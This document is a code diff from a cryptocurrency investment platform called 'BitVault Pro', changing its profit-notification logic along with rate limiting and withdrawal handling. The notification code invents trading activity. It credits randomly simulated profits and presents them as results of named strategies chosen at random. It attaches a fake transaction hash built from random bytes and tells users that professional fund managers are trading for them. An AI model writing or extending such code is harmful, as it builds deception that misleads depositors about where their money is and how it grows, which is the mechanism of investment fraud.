@@ -684,7 +684,7 @@ async function processAutomaticUpdates(): Promise<void> {
           if (Math.random() < 0.05) { // Only log occasionally
             console.log(`Investment #${investment.id} - Max profit reached (${currentGrossProfit.toFixed(2)} >= ${maxGrossProfit.toFixed(2)})`);
           }
-          continue;
+          continue; // Skip to next investment without adding profit
         }
 
         // Implement 70% success / 30% failure rate for realistic trading simulation
@@ -887,31 +887,61 @@ Your investment strategy is working! 🎉`,
 
           if (shouldCreateNotification) {
             const transactionId = crypto.randomBytes(32).toString('hex');
-            const performanceSources = [
-              "AI-Powered Market Analysis",
-              "Quantitative Trading Strategy",
-              "Professional Fund Management",
-              "Advanced Algorithm Trading",
-              "Portfolio Optimization Engine"
+            
+            // Top 10 strategy selection for plan growth
+            const planStrategies = [
+              {
+                name: "Automated DCA Protocol",
+                execution: "Systematic accumulation across 6 exchanges",
+                metric: "Average entry improved by 0.3%"
+              },
+              {
+                name: "Multi-Asset Rebalancing",
+                execution: "Portfolio rebalanced: BTC 60% | ETH 30% | Alts 10%",
+                metric: "Risk-adjusted returns optimized"
+              },
+              {
+                name: "Smart Contract Staking",
+                execution: "Distributed staking across 12 validators",
+                metric: "Uptime: 99.9% | Rewards auto-compounded"
+              },
+              {
+                name: "Quantitative Trading Bot",
+                execution: "ML algorithm detected 8 profitable patterns",
+                metric: "Win rate this cycle: 75%"
+              },
+              {
+                name: "Institutional Arbitrage",
+                execution: "Cross-market inefficiencies exploited",
+                metric: "Avg spread captured: 0.6%"
+              }
             ];
-            const randomSource = performanceSources[Math.floor(Math.random() * performanceSources.length)];
+
+            const planStrategy = planStrategies[Math.floor(Math.random() * planStrategies.length)];
+            const profitPercent = ((increase / currentBalance) * 100).toFixed(3);
 
             await storage.createNotification({
               userId: user.id,
-              title: "📈 Plan Performance Bonus",
-              message: `🏆 ${plan.name} Growth Update
+              title: "💰 Portfolio Growth - Strategy Executed",
+              message: `🎯 ${plan.name} • Active Management
 
-Your membership plan continues generating excellent returns!
+📊 AUTOMATED STRATEGY REPORT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Strategy: ${planStrategy.name}
+Execution: ${planStrategy.execution}
+Performance: ${planStrategy.metric}
 
-💰 Bonus Generated: +${increase.toFixed(8)} BTC
-🤖 Source: ${randomSource}
-📊 Daily Growth Rate: ${(dailyRate * 100).toFixed(3)}%
-🎯 Annual Projection: ${(dailyRate * 365 * 100).toFixed(1)}% APY
-
-Transaction ID: ${transactionId.substring(0, 16)}...${transactionId.substring(-8)}
+✅ PROFIT UPDATE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Latest Profit: +${increase.toFixed(8)} BTC (+${profitPercent}%)
 Updated Balance: ${newBalance.toFixed(8)} BTC
+Daily Return: ${(dailyRate * 100).toFixed(3)}%
+Annual Projection: ${(dailyRate * 365 * 100).toFixed(1)}% APY
 
-Keep growing with BitVault Pro! 🚀`,
+🔐 Transaction Hash:
+${transactionId}
+
+🚀 Your diversified investment strategy is performing excellently! Professional fund managers are actively optimizing your positions across multiple markets.`,
               type: 'success',
               isRead: false,
             });
@@ -1565,7 +1595,7 @@ You will receive a notification once your deposit is confirmed and added to your
 
   // Rate limiting map for deposit session creation (prevent spam attacks)
   const depositSessionRateLimits = new Map<number, { count: number; resetTime: number }>();
-  
+
   // Automated Deposit Session Endpoints
   app.post("/api/deposit/session", async (req, res) => {
     try {
@@ -1577,7 +1607,7 @@ You will receive a notification once your deposit is confirmed and added to your
       // SECURITY: Rate limiting - max 3 deposit sessions per hour per user
       const now = Date.now();
       const userRateLimit = depositSessionRateLimits.get(userId);
-      
+
       if (userRateLimit) {
         if (now < userRateLimit.resetTime) {
           if (userRateLimit.count >= 3) {
@@ -1604,7 +1634,7 @@ You will receive a notification once your deposit is confirmed and added to your
       const activePending = existingActiveSessions.filter(s => 
         s.status === 'pending' && new Date(s.expiresAt) > new Date()
       );
-      
+
       if (activePending.length > 0) {
         return res.status(400).json({ 
           error: "You already have an active deposit session. Please complete or wait for it to expire.",
@@ -1741,13 +1771,13 @@ You will receive a notification once your deposit is confirmed and added to your
       }
 
       const { token } = req.params;
-      
+
       // SECURITY: Rate limiting on confirmation attempts (max 5 per 10 minutes per IP)
       const clientIp = req.ip || req.headers['x-forwarded-for'] || 'unknown';
       const rateLimitKey = `${clientIp}-${userId}`;
       const now = Date.now();
       const confirmLimit = confirmRateLimits.get(rateLimitKey);
-      
+
       if (confirmLimit) {
         if (now < confirmLimit.resetTime) {
           if (confirmLimit.count >= 5) {
@@ -1841,8 +1871,7 @@ You will receive a notification once your deposit is confirmed and added to your
         confirmations: session.confirmations,
         amountReceived: session.amountReceived,
         createdAt: session.createdAt,
-        completedAt: session.completedAt,
-        timeRemaining: session.status === 'pending' ? Math.max(0, Math.floor((new Date(session.expiresAt).getTime() - Date.now()) / 1000)) : 0
+        completedAt: session.completedAt
       }));
 
       res.json(formattedSessions);
@@ -2048,10 +2077,10 @@ You will receive a notification once your deposit is confirmed and added to your
       if (transaction.type === "withdrawal") {
         // Import withdrawal service
         const { trc20WithdrawalService } = await import('./trc20-withdrawal');
-        
+
         // Get withdrawal address (from new field or fallback to transactionHash for legacy)
         const withdrawalAddress = transaction.withdrawalAddress || transaction.transactionHash;
-        
+
         if (!withdrawalAddress) {
           return res.status(400).json({ error: "Withdrawal address not found in transaction" });
         }
@@ -2067,7 +2096,7 @@ You will receive a notification once your deposit is confirmed and added to your
         if (!sendResult.success) {
           // Sending failed - reject transaction and refund balance
           await storage.rejectTransaction(transactionId, adminId, `Failed to send: ${sendResult.error}`);
-          
+
           // Refund balance to user
           const transactionUser = await storage.getUser(transaction.userId);
           if (transactionUser) {
@@ -2075,7 +2104,7 @@ You will receive a notification once your deposit is confirmed and added to your
             const refundAmount = parseFloat(transaction.amount);
             const newBalance = (currentBalance + refundAmount).toFixed(2);
             await storage.updateUserBalance(transaction.userId, newBalance);
-            
+
             console.log(`💸 [WITHDRAWAL] Refunded $${refundAmount} to user ${transaction.userId} | Balance: $${currentBalance} → $${newBalance}`);
           }
 
@@ -2094,7 +2123,7 @@ You will receive a notification once your deposit is confirmed and added to your
 
         // Sending successful - confirm transaction and store blockchain txHash
         const confirmedTx = await storage.confirmTransaction(transactionId, adminId, notes);
-        
+
         // Update transaction with actual blockchain hash
         await db.update(transactions)
           .set({ transactionHash: sendResult.txHash })
@@ -2188,7 +2217,7 @@ You will receive a notification once your deposit is confirmed and added to your
           const refundAmount = parseFloat(transaction.amount);
           const newBalance = (currentBalance + refundAmount).toFixed(2);
           await storage.updateUserBalance(transaction.userId, newBalance);
-          
+
           console.log(`💸 [WITHDRAWAL] Refunded $${refundAmount} to user ${transaction.userId} | Balance: $${currentBalance} → $${newBalance}`);
         }
       }
@@ -2368,7 +2397,7 @@ You will receive a notification once your deposit is confirmed and added to your
 
       // Import TRC20 wallet manager for address validation
       const { trc20WalletManager } = await import('./trc20-wallet');
-      
+
       // Validate TRC20 address format
       if (!trc20WalletManager.validateAddress(address)) {
         return res.status(400).json({ error: "Invalid TRC20 address format. Please provide a valid TRON address." });
@@ -2408,7 +2437,7 @@ You will receive a notification once your deposit is confirmed and added to your
       const pendingOrConfirmedWithdrawals = recentWithdrawals.filter(
         tx => tx.status === 'pending' || tx.status === 'confirmed'
       );
-      
+
       if (pendingOrConfirmedWithdrawals.length >= 3) {
         return res.status(429).json({ 
           error: "Too many withdrawal requests. Maximum 3 withdrawals per 24 hours for security." 
